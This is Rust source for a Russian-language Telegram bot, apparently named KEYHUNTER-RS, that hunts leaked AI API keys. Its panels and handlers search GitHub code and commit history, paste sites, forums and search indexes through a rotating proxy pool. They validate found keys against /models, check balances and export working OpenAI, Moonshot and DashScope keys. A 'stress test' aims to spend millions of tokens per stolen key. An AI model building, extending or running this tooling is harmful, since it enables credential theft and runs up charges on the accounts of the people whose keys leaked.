         ✅ AI VALID: <b>{}</b>\n\
         🔑 PAT найдено: <b>{}</b>\n\
         🎭 FAKE: <b>{}</b>\n\
         🆕 За сутки: <b>{}</b>\n\
         🚀 Сканов: <b>{}</b>",
        st.pats_alive,
        st.pats_total,
        search_left,
        if auto_on { "вкл" } else { "выкл" },
        active,
        if app.store.setting_i64("sources", 1) == 1 {
            "вкл"
        } else {
            "выкл"
        },
        crate::sources::source_count(),
        crate::sources::tasks().len(),
        st.hosts,
        st.findings,
        st.valid,
        st.pat_valid,
        st.fake,
        st.findings_today,
        st.jobs
    );
    (text, kb(vec![vec![("← Назад", "m:main")]]))
}

fn db_panel(app: &App) -> (String, Value) {
    let items = app.store.list_findings(10);
    let st = app.store.stats();
    let mut s = format!(
        "🗃 <b>БАЗА</b> · {} ключей · ✅ {} AI valid · 🔑 {} PAT найдено\n\n",
        st.findings, st.valid, st.pat_valid
    );
    if items.is_empty() {
        s.push_str("Пока пусто. Запусти скан — /scan owner/repo\n");
    }
    for f in items {
        let icon = match f.status.as_str() {
            "VALID" => "✅",
            "FAKE" => "🎭",
            "LIMIT" => "⏱️",
            "INVALID" => "❌",
            _ => "⚠️",
        };
        s.push_str(&format!(
            "{} <code>{}</code> · <code>{}</code>\n   📍 {} · {}\n",
            icon,
            esc(&crate::format::host_label(&f.endpoint)),
            mask(&f.key),
            esc(if f.repo.is_empty() {
                "manual"
            } else {
                f.repo.as_str()
            }),
            msk(f.last_checked)
        ));
    }
    s.push_str("\nКарточки уходят в отчётный чат автоматически.");
    (s, kb(vec![vec![("← Назад", "m:main")]]))
}

fn atlas_panel(app: &App) -> (String, Value) {
    let hosts = app.store.top_hosts(15);
    let total = app.store.hosts_count();
    let queries = app.store.query_count();
    let mut s = format!(
        "🗺 <b>АТЛАС</b> · хостов: <b>{}</b> · запросов: <b>{}</b>\n\n",
        total, queries
    );
    if hosts.is_empty() {
        s.push_str("Пока пусто. Автоскан наполнит атлас после первых находок.\n");
    }
    for h in &hosts {
        let icon = if h.valid > 0 { "✅" } else { "🗺" };
        s.push_str(&format!(
            "{} <code>{}</code> · {} · 🔑 {} · ✅ {}\n",
            icon,
            esc(&h.host),
            crate::atlas::host_layer(h),
            h.count,
            h.valid
        ));
    }
    if total > hosts.len() as i64 {
        s.push_str(&format!("… и ещё {}\n", total - hosts.len() as i64));
    }
    s.push_str("\nНовые хосты автоматически становятся запросами автоскана.");
    (s, kb(vec![vec![("← Назад", "m:main")]]))
}

fn sources_panel(app: &App) -> (String, Value) {
    let on = app.store.setting_i64("sources", 1) == 1;
    let interval = interval_label(app.store.setting_i64("source_interval", 15));
    let docs = app.store.setting_i64("source_docs", 300);
    let batch = app.store.setting_i64("source_batch", 4);
    let last = app.store.setting_i64("last_source", 0);
    let tasks = crate::sources::tasks();
    let mut counts: std::collections::BTreeMap<&str, usize> = std::collections::BTreeMap::new();
    for (s, _) in tasks {
        *counts.entry(*s).or_default() += 1;
    }
    let mut list = String::new();
    for (name, n) in &counts {
        list.push_str(&format!("• <b>{}</b> · {} задач\n", name, n));
    }
    let text = format!(
        "🌐 <b>ВНЕШНИЕ ИСТОЧНИКИ</b> · {} · {} источников / {} задач\n\n\
         ⏱ Каждые <b>{}</b> · документов: <b>{}</b> · потоков: <b>{}</b>\n\
         🕐 Последний: <b>{}</b>\n\
         🧭 Source Atlas: <b>{}</b> задач · frontier: <b>{}</b> страниц\n\n{}\n\
         🇨🇳 Китайские: Gitee, V2EX, NodeLoc, NodeSeek, Juejin, CSDN, SegmentFault\n\
         🌍 Глобальные: GitLab, Gitea, Codeberg, HF, Gists, npm, Bluesky, paste.gg\n\
         🔎 Индексы: Mojeek, Yandex, Baidu, Sogou, Naver, Startpage, SearX, urlscan\n\
         🕸 Глубина: <b>{}</b> · Bing/Brave + Torch + crawl по ссылкам\n\n\
         Цепочка та же: endpoint → ключ → /models → challenge → карточка.",
        if on { "вкл" } else { "выкл" },
        counts.len(),
        app.store.source_task_count(),
        interval,
        docs,
        batch,
        if last > 0 {
            msk(last)
        } else {
            "—".to_string()
        },
        app.store.source_task_count(),
        app.store.source_frontier_count(),
        list,
        app.store.setting_i64("source_crawl_depth", 4)
    );
    let toggle = if on {
        ("⏹ Выключить".to_string(), "src:off".to_string())
    } else {
        ("▶️ Включить".to_string(), "src:on".to_string())
    };
    let kbv = kb_s(vec![
        vec![toggle, ("🚀 Сейчас".to_string(), "src:now".to_string())],
        vec![
            ("⏱ Интервал".to_string(), "src:interval".to_string()),
            ("📄 Документов".to_string(), "src:docs".to_string()),
        ],
        vec![("🎚 Потоков".to_string(), "s:source_batch".to_string())],
        vec![("← Назад".to_string(), "m:main".to_string())],
    ]);
    (text, kbv)
}

fn proxy_panel(app: &App) -> (String, Value) {
    let auto = app.store.setting_i64("auto_proxy", 1) == 1;
    let scope = app.store.setting("proxy_scope", "sources");
    let interval = app.store.setting_i64("proxy_refresh", 300) / 60;
    let count = app.proxy_pool.count();
    let active = app.proxy_pool.active();
    let last = app.proxy_pool.last_refresh();
    let text = format!(
        "🌐 <b>ПРОКСИ-ПУЛ</b> · {}\n\n\
         🧩 Рабочих: <b>{}</b>\n\
         ⏱ Проверка каждые <b>{} мин</b>\n\
         🕐 Последняя: <b>{}</b>\n\
         🎯 Область: <b>{}</b>\n\
         📍 Активный: <code>{}</code>\n\n\
         Источников: <b>{}</b> публичных списков.\n\
         Режим <b>sources</b> — прокси для внешних источников;\n\
         <b>probe</b> — для проверки ключей; <b>all</b> — для всего.",
        if auto { "вкл" } else { "выкл" },
        count,
        interval,
        if last > 0 {
            msk(last)
        } else {
            "—".to_string()
        },
        esc(&scope),
        esc(active.as_deref().unwrap_or("direct / нет рабочих")),
        crate::proxy::list_count()
    );
    let toggle = if auto {
        ("⏹ Выключить".to_string(), "px:off".to_string())
    } else {
        ("▶️ Включить".to_string(), "px:on".to_string())
    };
    let kbv = kb_s(vec![
        vec![toggle, ("🔄 Проверить".to_string(), "px:now".to_string())],
        vec![("🎯 Область".to_string(), "px:scope".to_string())],
        vec![("← Назад".to_string(), "m:main".to_string())],
    ]);
    (text, kbv)
}

fn help_panel() -> (String, Value) {
    let text = "🛰 <b>KEYHUNTER-RS</b> · справка\n\n\
📡 <b>Автоскан</b>\n\
Работает сам: крутит пул запросов, учится на найденных хостах и углубляется в репозитории.\n\
<code>/auto on|off</code> · <code>/auto now</code> · <code>/auto</code> — статус\n\n\
🚀 <b>Ручной скан</b>\n\
<code>/scan owner/repo</code> — весь репозиторий\n\
<code>/scan repo:owner/repo</code> — то же явно\n\
<code>/scan \"sk-\" in:file</code> — GitHub + источники\n\n\
🔬 <b>Точечная проверка</b>\n\
<code>/check https://api.host/v1 sk-...</code>\n\n\
🗂 <b>PAT-пул</b>\n\
<code>/addpat</code> — залить GitHub/Gitee/GitLab/Gitea/Codeberg PAT\n\
<code>/pats</code> · <code>/delpat ID</code>\n\
<code>/lane ID official|pair|pat</code> — вручную перевести токен в лейн\n\
<code>/lane auto</code> — вернуть авто-раскладку 3 official / 2 pat / остальные pair\n\n\
🎯 <b>Запросы</b>\n\
<code>/queries</code> · <code>/toggleq ID</code> · <code>/addq ...</code>\n\n\
🌐 <b>Источники</b>\n\
<code>/sources</code> · <code>/sources on|off</code> · <code>/sources now</code>\n\
Gitee, GitLab, Gitea, Codeberg, HF, Gists, V2EX, NodeLoc, NodeSeek, Pastebin,\n\
Bing, Brave, Torch + Source Atlas: пивоты по endpoint и crawl по ссылкам.\n\n\
🌐 <b>Прокси</b>\n\
<code>/proxies</code> · <code>/proxies on|off</code> · <code>/proxies now</code> · <code>/proxies scope</code>\n\n\
🧪 <b>Чекер API</b>\n\
<code>/apicheck</code> — залить .txt: ключ + base url; отдаст только valid\n\
⚡ <b>Стресс-тест</b>\n\
<code>/stress</code> — ключ + base url; до 5 моделей, RPM/TPS/контекст и txt-отчёт\n\n\
📤 <b>Выгрузка</b>\n\
<code>/export</code> — меню: AI / DashScope / Moonshot / OpenAI / фильтр\n\
<code>/export all|dashscope|moonshot|openai|модель</code>\n\n\
📦 <b>Бэкап</b>\n\
<code>/backup</code> — код + БД ключей + .env + экспорт одним ZIP-архивом в ЛС админу\n\n\
⚙️ <b>Прочее</b>\n\
<code>/stats</code> · <code>/set probe_limit 26</code> · <code>/cancel</code>\n\n\
Как работает: ищет endpoint в коде → спускается в коммиты → достаёт ключ → GET /models → шлёт «hi» в каждую модель → карточка в отчётный чат.";
    (text.to_string(), kb(vec![vec![("← Назад", "m:main")]]))
}

async fn ask_pats(app: &Arc<App>, chat: i64, user: i64) -> Result<()> {
    app.set_pending(user, Pending::Pats);
    let kbv = json!({
        "force_reply": true,
        "input_field_placeholder": "ghp_… / glpat-… / gitee:… / gitlab:…"
    });
    let _ = app
        .tg
        .send(
            chat,
            "🗂 <b>Загрузка PAT</b>\n\nПришли токены одним сообщением — по одному в строке, через пробел или файлом <code>.txt</code>/<code>.csv</code>.\n\nGitHub: <code>ghp_…</code> / <code>github_pat_…</code>\nGitLab: <code>glpat-…</code> или <code>gitlab:…</code>\nGitee: <code>gitee:ТОКЕН</code>\nGitea: <code>gitea:ТОКЕН</code> · Codeberg: <code>codeberg:ТОКЕН</code>\n\nКаждый проверю через API провайдера и положу в пул. GitHub PAT идёт в code search, остальные — в соответствующие источники.",
            Some(kbv),
        )
        .await;
    Ok(())
}

async fn ask_api_check(app: &Arc<App>, chat: i64, user: i64) -> Result<()> {
    app.set_pending(user, Pending::ApiCheck);
    let kbv = json!({
        "force_reply": true,
        "input_field_placeholder": "ключ + base url, пары через пустую строку"
    });
    let _ = app
        .tg
        .send(
            chat,
            "🧪 <b>Чекер API</b>\n\n\
             Пришли <code>.txt</code> с парами:\n\
             <pre>sk-...\nhttps://api.host/v1\n\nsk-...\nhttps://api.host/v1</pre>\n\
             Проверю <code>/models</code>, рабочие модели и баланс. В ответ отдам <code>.txt</code> только с валидными ключами:\n\
             <pre>ключ\nбаланс\nработающие модели</pre>\n\n\
             Можно просто залить файл без команды — формат распознаю сам.",
            Some(kbv),
        )
        .await;
    Ok(())
}

async fn ask_stress(app: &Arc<App>, chat: i64, user: i64) -> Result<()> {
    app.set_pending(user, Pending::Stress);
    let kbv = json!({
        "force_reply": true,
        "input_field_placeholder": "ключ + base url для стресс-теста"
    });
    let _ = app
        .tg
        .send(
            chat,
            "⚡ <b>Стресс-тест API</b>\n\n             Пришли ключ и строкой ниже base url.\n             Найду до 5 рабочих моделей и прогоню нагрузку: RPM, TPS, контекст, латентность, ошибки и расход токенов.\n             Цель — не меньше 5–6 млн токенов за тест.\n\n             <pre>sk-...\nhttps://api.host/v1</pre>\n
             Можно залить .txt с двумя строками.",
            Some(kbv),
        )
        .await;
    Ok(())
}

async fn ask_scan(app: &Arc<App>, chat: i64, user: i64) -> Result<()> {
    app.set_pending(user, Pending::Scan);
    let kbv = json!({
        "force_reply": true,
        "input_field_placeholder": "owner/repo или \"sk-\" in:file"
    });
    let _ = app
        .tg
        .send(
            chat,
            "🚀 <b>Новый скан</b>\n\nПришли цель:\n• <code>owner/repo</code> — весь репозиторий\n• <code>repo:owner/repo</code>\n• <code>\"sk-\" in:file</code> — GitHub + источники",
            Some(kbv),
        )
        .await;
    Ok(())
}

async fn ask_query(app: &Arc<App>, chat: i64, user: i64) -> Result<()> {
    app.set_pending(user, Pending::QueryAdd);
    let kbv = json!({
        "force_reply": true,
        "input_field_placeholder": "\"sk-\" in:file"
    });
    let _ = app
        .tg
        .send(
            chat,
            "🎯 Пришли GitHub code search запрос. Он попадёт в ротацию Watch.",
            Some(kbv),
        )
        .await;
    Ok(())
}

async fn ask_setting(app: &Arc<App>, chat: i64, user: i64, key: &str) -> Result<()> {
    app.set_pending(user, Pending::Setting(key.to_string()));
    let label = setting_label(key);
    let current = match key {
        "proxy" => {
            let p = app.store.setting("proxy", "");
            if p.is_empty() {
                "нет".to_string()
            } else {
                p
            }
        }
        _ => app.store.setting(key, "—"),
    };
    let kbv = json!({
        "force_reply": true,
        "input_field_placeholder": "новое значение"
    });
    let extra = match key {
        "proxy" => "\n\nПустое сообщение или <code>-</code> — выключить.\nПример: <code>socks5://127.0.0.1:1080</code>",
        "report_chat" => "\n\nID чата, куда падают карточки. Для групп ID отрицательный.",
        _ => "",
    };
    let _ = app
        .tg
        .send(
            chat,
            &format!(
                "⚙️ <b>{}</b>\nСейчас: <code>{}</code>{}\n\nПришли новое значение.",
                label,
                esc(&current),
                extra
            ),
            Some(kbv),
        )
        .await;
    Ok(())
}

fn setting_label(key: &str) -> String {
    match key {
        "probe_limit" => "🧠 Моделей на ключ".into(),
        "probe_concurrency" => "⚡ Проб в параллель".into(),
        "concurrency" => "🔗 Ключей в параллель".into(),
        "commit_depth" => "🕳 Глубина коммитов".into(),
        "max_files" => "📄 Файлов на скан".into(),
        "scan_pages" => "🔎 Страниц поиска".into(),
        "max_probes" => "🎯 Проб на скан".into(),
        "min_stars" => "⭐ Мин. звёзд".into(),
        "recheck_hours" => "🔁 Recheck, часы".into(),
        "report_chat" => "📡 Отчётный чат".into(),
        "proxy" => "🌐 Прокси".into(),
        "watch_interval" => "⏱ Интервал Watch, сек".into(),
        "auto_interval" => "⏱ Интервал автоскана, сек".into(),
        "auto_batch" => "🎚 Авто-батч".into(),
        "deep_repos" => "🕳 Deep repos за цикл".into(),
        "cache_days" => "🗂 Кэш файлов, дни".into(),
        "source_interval" => "⏱ Интервал источников, сек".into(),
        "source_docs" => "📄 Документов за цикл источников".into(),
        "source_batch" => "🎚 Источников за цикл".into(),
        "probe_challenge" => "🎯 Challenge-слово".into(),
        other => other,
    }
    .to_string()
}

async fn apply_setting(app: &Arc<App>, key: &str, value: &str) -> Result<String> {
    let v = value.trim();
    let int_setting = |name: &str, lo: i64, hi: i64| -> Result<i64> {
        let n: i64 = v
            .parse()
            .map_err(|_| anyhow::anyhow!("нужно число {}..{}", lo, hi))?;
        if !(lo..=hi).contains(&n) {
            bail!("допустимо {}..{}", lo, hi);
        }
        app.store.set_setting(name, &n.to_string())?;
        Ok(n)
    };
    let msg = match key {
        "probe_limit" => format!("🧠 Моделей на ключ: <b>{}</b>", int_setting(key, 1, 120)?),
        "probe_concurrency" => {
            format!("⚡ Проб в параллель: <b>{}</b>", int_setting(key, 1, 48)?)
        }
        "concurrency" => {
            format!(
                "🔗 Ключей в параллель: <b>{}</b>",
                int_setting(key, 1, 128)?
            )
        }
        "workers" => format!(
            "🧵 Воркеров: <b>{}</b> · применяется после рестарта",
            int_setting(key, 1, 48)?
        ),
        "commit_depth" => {
            format!("🕳 Глубина коммитов: <b>{}</b>", int_setting(key, 0, 300)?)
        }
        "max_files" => format!("📄 Файлов на скан: <b>{}</b>", int_setting(key, 1, 2000)?),
        "scan_pages" => format!("🔎 Страниц поиска: <b>{}</b>", int_setting(key, 1, 10)?),
        "search_fresh_days" => format!(
            "🕒 Окно свежих репозиториев: <b>{} дн.</b>",
            int_setting(key, 0, 3650)?
        ),
        "official_scan_pages" => format!(
            "🔎 Страниц official-поиска: <b>{}</b>",
            int_setting(key, 1, 10)?
        ),
        "max_probes" => format!("🎯 Проб на скан: <b>{}</b>", int_setting(key, 1, 2000)?),
        "min_stars" => format!("⭐ Мин. звёзд: <b>{}</b>", int_setting(key, 0, 100_000)?),
        "recheck_hours" => format!("🔁 Recheck: <b>{} ч</b>", int_setting(key, 0, 720)?),
        "watch_interval" => format!(
            "⏱ Watch каждые <b>{} мин</b>",
            int_setting(key, 60, 86_400)? / 60
        ),
        "auto_interval" => format!(
            "⏱ Автоскан каждые <b>{}</b>",
            interval_label(int_setting(key, 20, 86_400)?)
        ),
        "auto_batch" => format!("🎚 Авто-батч: <b>{}</b>", int_setting(key, 1, 16)?),
        "source_interval" => format!(
            "🌐 Источники каждые <b>{}</b>",
            interval_label(int_setting(key, 10, 86_400)?)
        ),
        "source_docs" => format!(
            "🌐 Документов за цикл: <b>{}</b>",
            int_setting(key, 5, 2000)?
        ),
        "source_batch" => format!("🎚 Источников за цикл: <b>{}</b>", int_setting(key, 1, 32)?),
        "manual_dorks" => format!(
            "🧩 Ручной скан: дорков <b>{}</b>",
            int_setting(key, 1, 120)?
        ),
        "manual_skip_hours" => format!(
            "♻️ Ручной скан: пропуск известных пар <b>{}</b> ч",
            int_setting(key, 0, 720)?
        ),
        "manual_deep_hours" => format!(
            "🕳 Ручной скан: deep-кэш <b>{}</b> ч",
            int_setting(key, 1, 336)?
        ),
        "manual_force_rescan" => format!(
            "🔁 Ручной скан: force-rescan <b>{}</b>",
            int_setting(key, 0, 1)?
        ),
        "manual_sources_limit" => format!(
            "🌐 Ручной скан: источников <b>{}</b>",
            int_setting(key, 0, 120)?
        ),
        "checker_models" => format!(
            "🧪 Чекер: моделей на ключ <b>{}</b>{}",
            int_setting(key, 0, 512)?,
            if app.store.setting_i64("checker_models", 0) == 0 {
                " (0 = все)"
            } else {
                ""
            }
        ),
        "stress_target_tokens" => format!(
            "⚡ Стресс: цель <b>{}</b> токенов",
            int_setting(key, 100_000, 20_000_000)?
        ),
        "stress_models" => format!("⚡ Стресс: моделей <b>{}</b>", int_setting(key, 1, 5)?),
        "checker_threads" => format!("🧪 Чекер: потоков <b>{}</b>", int_setting(key, 1, 64)?),
        "checker_timeout" => format!("🧪 Чекер: таймаут <b>{}</b> сек", int_setting(key, 3, 30)?),
        "checker_probe_concurrency" => format!(
            "🧪 Чекер: параллельных проб <b>{}</b>",
            int_setting(key, 1, 64)?
        ),
        "deep_repos" => format!("🕳 Deep repos за цикл: <b>{}</b>", int_setting(key, 0, 20)?),
        "cache_days" => format!("🗂 Кэш файлов: <b>{} дн.</b>", int_setting(key, 0, 30)?),
        "report_chat" => {
            let n: i64 = v.parse().map_err(|_| anyhow::anyhow!("нужен chat_id"))?;
            app.store.set_setting(key, &n.to_string())?;
            format!("📡 Отчёты → <b>{}</b>", n)
        }
        "probe_challenge" => {
            let word = v.trim();
            if word.chars().count() < 2
                || word.chars().count() > 32
                || word
                    .chars()
                    .any(|c| !c.is_alphanumeric() && c != '-' && c != '_')
            {
                bail!("одно слово: 2..32 символа, только буквы/цифры/-/_");
            }
            app.store.set_setting(key, word)?;
            format!("🎯 Challenge: <b>{}</b>", esc(word))
        }
        "proxy" => {
            let p = if v.is_empty() || v == "-" || v == "off" {
                String::new()
            } else {
                v.to_string()
            };
            if !p.is_empty()
                && !(p.starts_with("http://")
                    || p.starts_with("https://")
                    || p.starts_with("socks5://")
                    || p.starts_with("socks5h://"))
            {
                bail!("нужен http(s):// или socks5:// URL");
            }
            app.store.set_setting(key, &p)?;
            app.set_proxy(if p.is_empty() { None } else { Some(p.clone()) })?;
            if p.is_empty() {
                "🌐 Прокси выключен".to_string()
            } else {
                format!("🌐 Прокси: <b>{}</b>", esc(&p))
            }
        }
        _ => bail!("неизвестный параметр"),
    };
    Ok(msg)
}

async fn handle_pat_document(app: &Arc<App>, chat: i64, doc: crate::tg::Document) -> Result<()> {
    let name = doc.file_name.clone().unwrap_or_default().to_lowercase();
    let mime = doc.mime_type.clone().unwrap_or_default();
    let is_text = name.ends_with(".txt")
        || name.ends_with(".csv")
        || name.ends_with(".env")
        || name.ends_with(".list")
        || mime.starts_with("text/");
    if !is_text {
        let _ = app
            .tg
            .send(
                chat,
                "⚠️ Пришли текстовый файл: <code>.txt</code>, <code>.csv</code> или <code>.env</code> с токенами.",
                None,
            )
            .await;
        return Ok(());
    }
    match app.tg.download_text(&doc.file_id, 2_000_000).await {
        Ok(content) => {
            let pairs = crate::checker::parse_pairs(&content);
            if !pairs.is_empty() {
                let n = pairs.len();
                let source = doc.file_name.clone().unwrap_or_else(|| "upload.txt".into());
                let a = app.clone();
                tokio::spawn(async move {
                    if let Err(e) = crate::checker::run(a, chat, pairs, source).await {
                        warn!("api checker: {e}");
                    }
                });
                let _ = app
                    .tg
                    .send(
                        chat,
                        &format!("📄 Файл получен: <b>{}</b> пар. Чекер запущен.", n),
                        None,
                    )
                    .await;
                return Ok(());
            }
            let a = app.clone();
            tokio::spawn(async move { add_pats(a, chat, content).await });
            let _ = app
                .tg
                .send(chat, "📄 Файл получен, проверяю токены…", None)
                .await;
        }
        Err(e) => {
            let _ = app
                .tg
                .send(chat, &format!("❌ {}", esc(&e.to_string())), None)
                .await;
        }
    }
    Ok(())
}

async fn handle_stress_document(app: &Arc<App>, chat: i64, doc: crate::tg::Document) -> Result<()> {
    let name = doc.file_name.clone().unwrap_or_default().to_lowercase();
    let mime = doc.mime_type.clone().unwrap_or_default();
    let is_text = name.ends_with(".txt")
        || name.ends_with(".csv")
        || name.ends_with(".env")
        || name.ends_with(".list")
        || mime.starts_with("text/");
    if !is_text {
        let _ = app
            .tg
            .send(chat, "⚠️ Нужен текстовый файл с ключом и base url.", None)
            .await;
        return Ok(());
    }
    match app.tg.download_text(&doc.file_id, 2_000_000).await {
        Ok(content) => {
            let pairs = crate::checker::parse_pairs(&content);
            if pairs.is_empty() {
                let _ = app
                    .tg
                    .send(
                        chat,
                        "⚠️ В файле нет пары. Формат: ключ, строка ниже base url.",
                        None,
                    )
                    .await;
                return Ok(());
            }
            let source = doc.file_name.clone().unwrap_or_else(|| "stress.txt".into());
            let n = pairs.len();
            let a = app.clone();
            tokio::spawn(async move {
                if let Err(e) = crate::stress::run(a, pairs, source).await {
                    warn!("stress test: {e}");
                }
            });
            let _ = app
                .tg
                .send(
                    chat,
                    &format!(
                        "⚡ Файл получен: <b>{}</b> пар. Запускаю стресс-тест (беру первую пару).",
                        n
                    ),
                    None,
                )
                .await;
        }
        Err(e) => {
            let _ = app
                .tg
                .send(chat, &format!("❌ {}", esc(&e.to_string())), None)
                .await;
        }
    }
    Ok(())
}

async fn handle_api_check_document(
    app: &Arc<App>,
    chat: i64,
    doc: crate::tg::Document,
) -> Result<()> {
    let name = doc.file_name.clone().unwrap_or_default().to_lowercase();
    let mime = doc.mime_type.clone().unwrap_or_default();
    let is_text = name.ends_with(".txt")
        || name.ends_with(".csv")
        || name.ends_with(".env")
        || name.ends_with(".list")
        || mime.starts_with("text/");
    if !is_text {
        let _ = app
            .tg
            .send(
                chat,
                "⚠️ Нужен текстовый файл <code>.txt</code> с парами ключ + base url.",
                None,
            )
            .await;
        return Ok(());
    }
    match app.tg.download_text(&doc.file_id, 2_000_000).await {
        Ok(content) => {
            let pairs = crate::checker::parse_pairs(&content);
            if pairs.is_empty() {
                let _ = app
                    .tg
                    .send(
                        chat,
                        "⚠️ В файле нет пар. Формат: ключ, строка ниже base url, пустая строка между парами.",
                        None,
                    )
                    .await;
                return Ok(());
            }
            let n = pairs.len();
            let source = doc.file_name.clone().unwrap_or_else(|| "upload.txt".into());
            let a = app.clone();
            tokio::spawn(async move {
                if let Err(e) = crate::checker::run(a, chat, pairs, source).await {
                    warn!("api checker: {e}");
                }
            });
            let _ = app
                .tg
                .send(
                    chat,
                    &format!("📄 Файл получен: <b>{}</b> пар. Чекер запущен.", n),
                    None,
                )
                .await;
        }
        Err(e) => {
            let _ = app
                .tg
                .send(chat, &format!("❌ {}", esc(&e.to_string())), None)
                .await;
        }
    }
    Ok(())
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum ExportPreset {
    All,
    DashScope,
    Moonshot,
    OpenAi,
    Custom,
}

impl ExportPreset {
    fn label(self) -> &'static str {
        match self {
            Self::All => "все AI-ключи",
            Self::DashScope => "DashScope",
            Self::Moonshot => "Moonshot (офиц.)",
            Self::OpenAi => "OpenAI (офиц.)",
            Self::Custom => "фильтр",
        }
    }

    fn slug(self) -> &'static str {
        match self {
            Self::All => "all",
            Self::DashScope => "dashscope",
            Self::Moonshot => "moonshot",
            Self::OpenAi => "openai",
            Self::Custom => "filter",
        }
    }
}

fn working_models(f: &Finding) -> Vec<&str> {
    f.probes
        .iter()
        .filter(|p| p.code == 200 && p.note.is_empty())
        .map(|p| p.model.as_str())
        .collect()
}

fn export_matches(f: &Finding, preset: ExportPreset, filter: Option<&str>) -> bool {
    let host = crate::extract::host_of(&f.endpoint);
    match preset {
        ExportPreset::All => true,
        ExportPreset::DashScope => {
            host.contains("dashscope")
                || host.contains("maas.aliyuncs.com")
                || crate::extract::is_dashscope_workspace_endpoint(&f.endpoint)
        }
        ExportPreset::Moonshot => host == "api.moonshot.cn" || host == "api.moonshot.ai",
        ExportPreset::OpenAi => host == "api.openai.com",
        ExportPreset::Custom => {
            let Some(needle) = filter.map(str::trim).filter(|s| !s.is_empty()) else {
                return false;
            };
            let needle = needle.to_lowercase();
            f.endpoint.to_lowercase().contains(&needle)
                || working_models(f)
                    .iter()
                    .any(|m| m.to_lowercase().contains(&needle))
        }
    }
}

fn export_count(findings: &[Finding], preset: ExportPreset) -> usize {
    findings
        .iter()
        .filter(|f| export_matches(f, preset, None))
        .count()
}

fn export_menu_panel(app: &App) -> (String, Value) {
    let findings = app.store.valid_findings();
    let text = format!(
        "📤 <b>ЭКСПОРТ VALID</b>\n\n\
         AI-ключей: <b>{}</b>\n\
         🧠 DashScope: <b>{}</b>\n\
         🌙 Moonshot (офиц.): <b>{}</b>\n\
         🤖 OpenAI (офиц.): <b>{}</b>\n\n\
         Формат файла:\n\
         <code>ключ\nendpoint</code>\n\n\
         Для модели отправляется <code>hi</code> — в файл попадут только ответившие ключи.",
        findings.len(),
        export_count(&findings, ExportPreset::DashScope),
        export_count(&findings, ExportPreset::Moonshot),
        export_count(&findings, ExportPreset::OpenAi)
    );
    let kbv = kb_s(vec![
        vec![
            ("📤 Все AI-ключи".into(), "x:all".into()),
            ("🧠 DashScope".into(), "x:dashscope".into()),
            ("🌙 Moonshot".into(), "x:moonshot".into()),
        ],
        vec![("🤖 OpenAI".into(), "x:openai".into())],
        vec![("🔎 Модель / endpoint".into(), "x:filter".into())],
        vec![("← Назад".into(), "m:main".into())],
    ]);
    (text, kbv)
}

async fn ask_export_filter(app: &Arc<App>, chat: i64, user: i64) -> Result<()> {
    app.set_pending(user, Pending::ExportFilter);
    let kbv = json!({
        "force_reply": true,
        "input_field_placeholder": "claude-opus-5 или api.openai.com"
    });
    let _ = app
        .tg
        .send(
            chat,
            "🔎 <b>Фильтр экспорта</b>\n\n\
             Пришли модель или часть endpoint, например:\n\
             <code>claude-opus-5</code>\n\
             <code>api.openai.com</code>\n\
             <code>dashscope</code>\n\n\
             Попадут только VALID-ключи, у которых endpoint содержит эту строку. Если это модель — для каждого ключа будет отправлен запрос <b>hi</b>, и в файл попадут только ответившие модели.",
            Some(kbv),
        )
        .await;
    Ok(())
}

fn matching_models(f: &Finding, needle: &str) -> Vec<String> {
    let mut out: Vec<String> = f
        .models
        .iter()
        .chain(f.probes.iter().map(|p| &p.model))
        .filter(|m| m.to_lowercase().contains(needle))
        .cloned()
        .collect();
    out.sort_by_key(|m| {
        let lower = m.to_lowercase();
        (lower != needle, m.len())
    });
    out.dedup();
    out
}

async fn select_custom(
    app: &Arc<App>,
    chat: i64,
    findings: Vec<Finding>,
    needle: String,
) -> Vec<Finding> {
    let mut selected: Vec<Finding> = Vec::new();
    let mut checks: Vec<(Finding, Vec<String>)> = Vec::new();
    for f in findings {
        if f.endpoint.to_lowercase().contains(&needle) {
            selected.push(f);
        } else {
            let models = matching_models(&f, &needle);
            if !models.is_empty() {
                checks.push((f, models));
            }
        }
    }
    if checks.is_empty() {
        return selected;
    }

    let total = checks.len();
    let mid = app
        .tg
        .send(
            chat,
            &format!(
                "🧪 <b>Проверяю модель</b> <code>{}</code> запросом <b>hi</b>\nКлючей: <b>{total}</b> · потоков: <b>8</b>",
                esc(&needle)
            ),
            None,
        )
        .await
        .ok();
    let done = Arc::new(AtomicUsize::new(0));
    let needle_for_task = needle.clone();
    let futs = stream::iter(checks.into_iter().map(|(finding, models)| {
        let app = app.clone();
        let done = done.clone();
        let mid = mid;
        let needle = needle_for_task.clone();
        async move {
            let mut ok = false;
            for model in models.iter().take(5) {
                if app
                    .prober
                    .test_model_hi(&finding.endpoint, &finding.key, model)
                    .await
                {
                    ok = true;
                    break;
                }
            }
            let n = done.fetch_add(1, Ordering::Relaxed) + 1;
            if let Some(mid) = mid {
                if n == total || n % 5 == 0 {
                    let _ = app
                        .tg
                        .edit(
                            chat,
                            mid,
                            &format!(
                                "🧪 <b>Проверяю модель</b> <code>{}</code> · <b>{n}</b> / {total}",
                                esc(&needle)
                            ),
                            None,
                        )
                        .await;
                }
            }
            (finding, ok)
        }
    }))
    .buffer_unordered(8);
    let results: Vec<(Finding, bool)> = futs.collect().await;
    for (finding, ok) in results {
        if ok {
            selected.push(finding);
        }
    }
    if let Some(mid) = mid {
        let _ = app
            .tg
            .edit(
                chat,
                mid,
                &format!(
                    "✅ <b>Модель</b> <code>{}</code> · рабочих ключей: <b>{}</b> / {total}",
                    esc(&needle),
                    selected.len()
                ),
                None,
            )
            .await;
    }
    selected
}

async fn export_filtered(
    app: &Arc<App>,
    chat: i64,
    preset: ExportPreset,
    filter: Option<String>,
) -> Result<()> {
    // A custom model filter performs live `hi` probes. Run it off the update
    // loop so /cancel, /panel and every other command stay responsive.
    if preset == ExportPreset::Custom {
        let bg = app.clone();
        let filter_for_task = filter.clone();
        tokio::spawn(async move {
            if let Err(e) = export_filtered_impl(&bg, chat, preset, filter_for_task).await {
                tracing::warn!("custom export: {e}");
            }
        });
        let label = filter.as_deref().unwrap_or("?");
        let _ = app
            .tg
            .send(
                chat,
                &format!("📤 <b>Экспорт запущен</b> · <code>{}</code>", esc(label)),
                None,
            )
            .await;
        return Ok(());
    }
    export_filtered_impl(app, chat, preset, filter).await
}

async fn export_filtered_impl(
    app: &Arc<App>,
    chat: i64,
    preset: ExportPreset,
    filter: Option<String>,
) -> Result<()> {
    let findings = app.store.valid_findings();
